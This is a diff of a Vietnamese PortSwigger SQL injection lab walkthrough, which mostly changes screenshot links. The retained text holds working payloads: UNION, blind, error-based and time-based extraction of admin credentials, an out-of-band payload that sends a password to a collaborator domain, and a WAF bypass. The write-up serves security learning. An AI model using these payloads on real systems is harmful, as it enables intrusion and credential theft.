@@ -18,7 +18,7 @@ EX:
 
         https://0a7d004803a4224c80d56c540074003b.web-security-academy.net/filter?category=Accessories'
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/4130de02-f2ed-45d5-8abd-f5d8a9bb3a0e)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/814fd0c0-85b5-42d4-83e9-0e7c0764360f)
 
 + ta thấy khi chèn quote = ' -> server sql không lọc được special char và bị interupt bới ' dẫn đến error 500 là bên server 
 
@@ -36,7 +36,7 @@ Payload:
 
        SELECT * FROM products WHERE category = 'Accessories' OR 1=1 --' AND released = 1
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/453c08b8-d766-479d-b5df-3df311acee3d)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/89919f7b-019d-4be8-9951-4ed382d7ea12)
 
 > solution
 
@@ -52,7 +52,7 @@ Payload:
 
 + step 1 : Recon
 
-  ![image](https://github.com/j10nelop/m3d1r/assets/152776722/de60fefe-ae88-47eb-85cd-4d60835971ca)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/cb29a8c4-620f-43ba-a2f5-6bc421ce2520)
 
 
    - sau khi kiểm tra bằng quote ' thì lỗi server đang ở chức năng username input
@@ -71,7 +71,7 @@ Payload:
 
 => username administrator là hợp lệ còn password là bypass
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/ca376e12-faaa-47d4-bbf7-9906ea33acb4)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/7a14b8dd-5067-4fc4-a4e4-a5443670206c)
 
 > solution
 
@@ -110,11 +110,11 @@ C2: dùng với UNION select null => nếu đủ thông tin về số cột đư
 
 + sau khi check ' thì ra thông báo lỗi
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/d6b25631-568a-4ed5-aa41-2553c1a7f32a)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/684b8a40-a2b9-4e50-9abf-feefb6549242)
 
 + check cột thì xác định là có 2 cột = 'order by 3 -- => lỗi
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/9b808b9d-949b-455e-bc1e-6b8eb945b895)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/60a64355-0cc1-49bd-ad9d-440b418ca141)
 
 + step 2: Exploit
 
@@ -122,13 +122,13 @@ ta sẽ dùng payload :
 
       'union select null, banner from v$version --
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/0ba732a4-1576-41cb-a8bb-023b625915d8)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/3039208e-5ad0-4ced-81ba-a5644fbaf5d6)
 
 + provide số cột hợp lệ là null , banner (null có thể là bất cứ char hay number gì )
 
 + from table v$version
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/66a1ecde-6aa1-4978-97b6-1da52b095451)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/bb3a6255-a397-4eaf-a972-1422cf29d343)
 
 => solve lab 3
 
@@ -145,7 +145,7 @@ ta sẽ dùng payload :
  
   - checking số cột => 'order by 2 -- - => bypass filter bằng khoảng trắng nhưng vẫn hợp lệ
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/3ca34d31-8f06-4597-bc3e-66c0d9dc169d)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/70d9f358-6726-4abe-aa14-d21d1c3d6cb3)
 
 => chỉ có 2 cột 
 
@@ -159,7 +159,7 @@ ta sẽ dùng payload :
 
 => vì ta check dần thông tin về database version trên portswigger cheat sheet
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/926d8f90-47ae-47f5-9760-a80656fa4ec8)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/01f1c317-2574-4514-ba7b-cc72e721c435)
 
 => solve lab 4
 
@@ -178,13 +178,13 @@ ta sẽ dùng payload :
 
  - check thông tin số cột dùng order by => 'order by 3 -- => lỗi => 2 cột
 
-   ![image](https://github.com/j10nelop/m3d1r/assets/152776722/57e81440-65f1-46a0-9892-10e455ac2737)
+   ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/8e6ff1fd-08df-4cdb-912c-40bf1fa20284)
 
 - check version của sql => PostgreSQL
 
       'union select null , version() --
 
-  ![image](https://github.com/j10nelop/m3d1r/assets/152776722/77105087-7bf8-4f47-b78f-eda15227d3e9)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/64735103-37c5-4e7e-b217-7c580598c888)
 
 + step 2: Exploit
 
@@ -200,11 +200,11 @@ ta sẽ dùng payload :
 
 => chứa gồm nhiều bảng 
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/155a5e46-63eb-4eb0-859c-b30a52d4ee56)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/aff51f6e-4db5-4932-ae12-712842a8656c)
 
 => thông tin về : table_name = 'users_whkkxc'
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/4d213e04-a1dd-4957-a57a-cb92c329c6d9)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/c23e27b8-abba-4a6f-8610-8aa406912a51)
 
 => tìm được 2 cột là username_aamfgq và password_lezury
 
@@ -212,7 +212,7 @@ ta sẽ dùng payload :
 
       'union select username_aamfgq,password_lezury  from users_whkkxc --
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/dd219a59-4d3c-46fd-9816-ab0070b3792c)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/137e3435-29cc-41db-aac5-d569acf3def4)
 
 => username = administrator và password = udoct5pqg8rifxz14fbh
 
@@ -240,19 +240,19 @@ payload:
 
       'union select null, table_name from all_tables --
             
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/eb9ced69-1ac8-4766-9b21-20916fed6f08)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/219c0904-727c-48d1-b02b-370d010f293a)
 
 => tables là USERS_ROYLCF
 
       'union select null, column_name from all_tab_columns where table_name = 'USERS_ROYLCF' --
       
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/bfcc1f63-329c-4cf4-8ce5-de3f8d1878f5)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/2cc8cdb1-e5e6-41aa-8bb4-15aecf11da46)
 
 => column là USERNAME_HDIDAS và PASSWORD_RQTIMB
 
       'union select USERNAME_HDIDAS, PASSWORD_RQTIMB from USERS_ROYLCF --
       
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/cf8a6969-f5bb-4ef0-9bee-ee3ff3471612)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/c99b76a6-24af-41ac-9328-40f291dcf408)
 
 => username = administator và password = rz22yzn292lb4uq4ex5e
 
@@ -271,7 +271,7 @@ payload:
 
   - check số cột ta có 3 cột -> 'order by 4 -- => error
  
-  ![image](https://github.com/j10nelop/m3d1r/assets/152776722/3ee48244-c85b-486f-97f4-c7db70b1f8f8)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/0c180061-e99f-40e5-8436-454ab971614e)
 
   => mục tiêu là  additional row containing null values
 
@@ -281,7 +281,7 @@ payload:
 
         'union select NULL,NULL,null --
 
-  ![image](https://github.com/j10nelop/m3d1r/assets/152776722/a30b733f-4a48-43ee-849f-3ad40efc8ddd)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/1f2fda15-9f94-42cb-a7dd-5ac626ecbc51)
 
 => solve lab 7
 
@@ -304,7 +304,7 @@ payload:
 
         'UNION select null,null,null --
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/3b68e736-b7a7-422d-89f7-8a62311af380)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/9f1c3537-f29d-4ca1-9ff3-9a1e06c743be)
 
 => để trả về value hợp lệ tương ứng số cột và ta sẽ dò kí tự với từng cột 
 
@@ -312,7 +312,7 @@ payload:
 
       'union select null,'bSbgdS',null --
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/1f5fd5c1-7404-4202-b559-3b49bfd1016d)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/fcfde308-c815-49df-a8ac-4291084608df)
 
 => solve lab 8.
 
@@ -338,7 +338,7 @@ payload:
 
         'union select username , passsord from users --
 
-![image](https://github.com/j10nelop/m3d1r/assets/152776722/733b8276-06c8-44d8-a70a-9125d85cfa7e)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/de297d0d-b50c-4e0f-b204-68d31915290d)
 
 => đây là là 1 list của username và password đã được injection query -> username = administartor & password = id6y6c8xjtu63s5hbiro
 
@@ -366,7 +366,7 @@ payload:
 
             'union select null, username ||'+'|| password from users --
 
-  ![image](https://github.com/j10nelop/m3d1r/assets/152776722/86afcd3b-760e-430f-881f-1ed33c6051f3)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/0e031162-d7e6-4b83-9a7c-ebcc5986dee8)
 
 => solve lab 10 
 
@@ -389,7 +389,8 @@ To solve the lab, log in as the administrator user.
  
   - ta chú ý đến text welcome back! và cookie mục tracking id được gợi ý => check quote ' trên trackid không trả về welcome back! và thêm AND 1=1 -- thì nó lại trả về welcome back
  
-  ![image](https://github.com/j10nelop/Pr1vate/assets/152776722/423b7bc9-8b2e-4e4a-8413-2854fbfa2940)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/1680b6a9-180c-468e-b0f6-1644bf456831)
+
 
 => ta cũng có thể sử dụng or với giá trị trackid là không hợp lệ cũng được => or là chọn ra 1 trường hợp khác để chèn 
 
@@ -408,7 +409,7 @@ To solve the lab, log in as the administrator user.
 
 EX:
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/f3a818fd-e088-4e7a-9d5c-c39ed89ac479)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/2ae80387-b410-454e-b6d0-088178f91804)
 
 => true = 1 còn false = 0
 
@@ -427,11 +428,12 @@ EX:
 
       + i là số phải tìm có thể > 1 nhưng đến > 21 là false thì dùng => biết được số chứa kí tự trong password
 
-   ![image](https://github.com/j10nelop/Pr1vate/assets/152776722/a0ba1912-87c0-4375-8166-40ce3cdbbb3c)
+   ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/8a47545f-ed22-4915-affb-b6fa3201b2f2)
 
   => grep match là pin phần có trả về welcome back!
 
-  ![image](https://github.com/j10nelop/Pr1vate/assets/152776722/9c16bee3-2759-450b-9b44-b3178d0afb94)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/a456bdc9-e07e-472e-a878-720ad451fc1f)
+
 
  => length của password = 19 
 
@@ -441,16 +443,10 @@ EX:
 
   - SUBSTR(substring)(expression, start, length): ví dụ nếu độ dài length mà ta cho là 19 => {c} sẽ brute force lâu hơn là setup start là từng kí tự
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/be1ae294-cadd-49a1-87c8-ba1c96fd3775)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/dfbb823f-e00e-4846-a98e-f03a366a865b)
 
 + ta sẽ được string như thế này tiếp tục sẽ thành password
 
-- c2: dùng python code: => another laptop 
-
-```
-
-
-```
 => solve lab 11
 
 # Lab 12: Blind SQL injection with conditional errors
@@ -467,15 +463,16 @@ EX:
 
   - checking qua web thì có vẻ chưa thấy có dấu hiệu gì nên sử dụng single quote cho tracking id thì ta nhận được error 500
 
-  ![image](https://github.com/j10nelop/Pr1vate/assets/152776722/eb08dae3-0185-43c1-9eb0-f9397a2675aa)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/15764768-7f08-45b0-b378-f5d5215901d4)
 
   - sau khi sử dụng 'OR 1=0 -- thì nó trả về hợp lệ => ta có thể cho rằng cấu trúc syntax của sql này sẽ là đúng và hợp lệ thì nó sẽ trả về 200 chứ không phải xử lí điều kiện bên trong là true hay false
  
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/d7484d4b-a5b4-4082-9140-fad0f818ba23)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/74e96c46-7752-4543-bcd2-01a82c98c17d)
 
 - ta có thể recon cột bảng của database trong page
 
-  ![image](https://github.com/j10nelop/Pr1vate/assets/152776722/54bc07ee-db75-4b51-b390-d65ac4abeb7b)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/253b3b27-4090-4017-8735-434aee49e203)
+
 
 
 
@@ -509,7 +506,8 @@ syntax:
 
       ```'OR (select case when length(password) > i then to_char(1/0) else 'a' end from users where username = 'administrator') = 'a' --```
 
-  ![image](https://github.com/j10nelop/Pr1vate/assets/152776722/28337a33-f612-4b97-ac80-dfcb5301452d)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/c956f323-2ecb-4fb0-b29a-8d481951d210)
+
 
 => ta có length = 20 vì set length(password)> 19 tức 20 kí tự 
 
@@ -521,7 +519,7 @@ syntax:
 
 + substring chỉ dùng trên sql server thui còn SUBSTR có thể dùng các dbms khác trừ sql server
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/8992defc-ed95-4dc4-8b46-e600125996e5)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/73997a23-fcc4-40f9-bd4a-e236d9d486e9)
 
 => tiếp tục sẽ tìm ra password của user admin
 
@@ -537,7 +535,8 @@ syntax:
 
   - bài này là dạng visible error base tức là sẽ có thể check được respond verbose trên page
 
-  ![image](https://github.com/j10nelop/Pr1vate/assets/152776722/003d7b12-737c-42b0-a4ee-18552cd32180)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/eecca9ba-7e34-4ba3-84fd-3ef844222845)
+
 
 => hiện ra thông tin lỗi về sql dạng này là cơ bản nên ít khi vào 
 
@@ -557,13 +556,14 @@ syntax:
 
           'OR 1=CAST((select username from users)AS INT)--
 
-    ![image](https://github.com/j10nelop/Pr1vate/assets/152776722/538b41dc-2bbf-4f06-8843-6369b08fb168)
+    ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/e3e54728-76a4-4ed8-a1af-a335fb2b5a30)
+
 
 => hiện ra thông báo về độ dài của query hơi dài nên đã chèn mất phần INT -> chỉ cần loại bỏ cookie trackid là xong
 
 - khi loại bỏ thì ta thấy có 1 thông báo
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/7f260b07-21ca-48f5-a533-0113d9a3b505)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/1b164cb2-c524-4942-9089-394adfb5fdba)
 
 => nhiệm vụ set up limit 1 cho query trên
 
@@ -571,7 +571,7 @@ syntax:
 
             'OR 1=CAST((SELECT password from users limit 1)AS INT )-- 
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/97197fa1-5e47-416b-9f49-e030ecde933f)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/8c2d755f-4e01-46f8-8897-dfa2a66071b3)
 
 => solve lab 13
 
@@ -594,7 +594,8 @@ syntax:
 
         '||pg_sleep(10)--
 
-  ![image](https://github.com/j10nelop/Pr1vate/assets/152776722/461f1d05-9897-4e70-b292-278e6c050caa)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/afca2623-5a9f-4989-90f0-7d5b906d21b3)
+
 
 => ta nhìn vào millis là 5,.. đã ngắt được 5s 
 
@@ -614,7 +615,7 @@ syntax:
 
   - ta có payload check bài trên là ||pg_sleep --
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/5c5245b9-c4f7-4f26-9b55-e5f125d2a5e1)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/49ca2e6f-91ea-4f72-bee3-f51b01905650)
 
 + step 2 :Exploit
       - payload test:
@@ -630,7 +631,7 @@ syntax:
 
           '||(select case when length(password) > i then pg_sleep(10) else pg_sleep(-1) end  from users where username = 'administrator') --
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/1d2f48b5-6a7a-42fd-9fc3-bd56327dedbf)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/dd71f72e-3470-4f32-bc0b-f76fabc94288)
 
 => vì length > 19 => là kí tự nó sẽ 20 digits
 
@@ -642,7 +643,7 @@ syntax:
 
 + vì sleep 10 hơi lâu nên để sleep 5 => recevied > 5s
 
-  ![image](https://github.com/j10nelop/Pr1vate/assets/152776722/3dba44d2-cbcb-4535-941e-1466b3125d17)
+  ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/c32e179d-d07e-45a8-9832-337eccb36ad6)
 
 => solve lab 15
 
@@ -660,13 +661,13 @@ syntax:
  
   - nơi xảy ra lỗ hổng nằm ở cookie track id
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/00dc624e-2b98-4bc1-afab-cb69877f6b12)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/b52e817e-0be7-410d-bdc2-b863a1c25082)
 
 => auto check 
  
 + step 2: Exploit
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/3246ba26-d7a6-4c17-bc4b-589850c106f9)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/a19ec7d9-2873-4e70-92c5-6ac985b454f6)
 
 
  - payload: 
@@ -679,7 +680,7 @@ syntax:
 
    ```
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/b6117b7b-b10e-4748-aeb6-29add1d2e48e)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/d65aa1d1-4328-435e-a1b0-a73b786dd587)
 
 => poll dns capture từ hệ thống hook dns 
 
@@ -709,7 +710,7 @@ syntax:
 
        ' ||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+where+username+%3d+'administrator'+)||'.qhb7e1w4fjkq23gzsj52b0nfc6ix6m.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual+)+--
   
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/9be8b3c2-8d80-445d-a345-71a41c54d66d)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/3cd32cd6-dd9c-4e6e-a3e9-df9c98a3e489)
 
 => password nằm ở dns poll now là 'esdwmb00nnzjq1iv4vfp'  vì sau .collab brup là select password nên => là nó
 
@@ -729,7 +730,8 @@ syntax:
  
   - khi ta checking với quote ' trên product và store check thì dích attack detected có lẽ bên server đang chặn lỗi và in ra detection
 
- ![image](https://github.com/j10nelop/Pr1vate/assets/152776722/59dab2a9-7c50-4405-852d-f1c0a91eb6e2)
+ ![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/b8f64102-27c2-4aa0-9634-37a4475b4569)
+
 
  => ta cần tải extension hackvertor bypass WAF filter với sql injection 
 
@@ -745,7 +747,7 @@ syntax:
 
       <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId><@hex_entities>2 UNION select NULL<@/hex_entities> </storeId></stockCheck>
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/b1f12ceb-8a62-4c43-91d6-5bb31baf3220)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/c356b5b9-3322-49d2-a064-68dd6f41903e)
 
 => đã chèn được 'a'  
 
@@ -753,6 +755,6 @@ payload solve :
 
       <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId><@hex_entities>2 union select username||': '||password from users<@/hex_entities> </storeId></stockCheck>
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/8b592546-4395-4d99-a768-872249e2a3f4)
+![image](https://github.com/neo-M3tinez/Portswigger/assets/174318737/f366d345-6afe-4fd2-9a31-8f0b7c01133e)
 
 => solve lab 18
